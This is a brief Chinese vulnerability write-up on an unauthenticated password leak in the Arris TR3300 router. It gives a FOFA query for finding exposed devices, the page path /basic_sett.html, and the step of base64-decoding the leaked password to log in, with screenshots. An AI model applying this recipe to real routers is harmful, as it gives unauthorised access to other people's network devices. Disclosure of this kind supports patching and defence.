# Arris TR3300路由器basic_sett存在未授权信息泄露漏洞

# 一、漏洞简介
Arris TR3300路由器basic_sett存在未授权信息泄露漏洞

# 二、影响版本
+ Arris路由器

# 三、资产测绘
+ fofa`body="base64encode(document.tF.pws.value)" || body="ARRIS TR3300"`
+ 特征

![1716312584374-f0336037-460d-4dea-906c-64bdfc4f4c2e.png](./img/teksQfdjF22G8qcp/1716312584374-f0336037-460d-4dea-906c-64bdfc4f4c2e-875869.png)

# 四、漏洞复现
```plain
/basic_sett.html
```

密码泄露：

![1716312848098-bd944f8e-fbeb-4124-8091-eef498dbb93f.png](./img/teksQfdjF22G8qcp/1716312848098-bd944f8e-fbeb-4124-8091-eef498dbb93f-941455.png)

base64解密后登录系统

![1716312869564-ba0d97cd-cf30-427f-a3f2-43bed255913d.png](./img/teksQfdjF22G8qcp/1716312869564-ba0d97cd-cf30-427f-a3f2-43bed255913d-659160.png)

![1716312948463-4d0f810a-8bc3-4ae0-983f-1a7ba7a195d3.png](./img/teksQfdjF22G8qcp/1716312948463-4d0f810a-8bc3-4ae0-983f-1a7ba7a195d3-124062.png)



> 更新: 2024-05-23 13:30:54  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bts33znxgp7g76vr>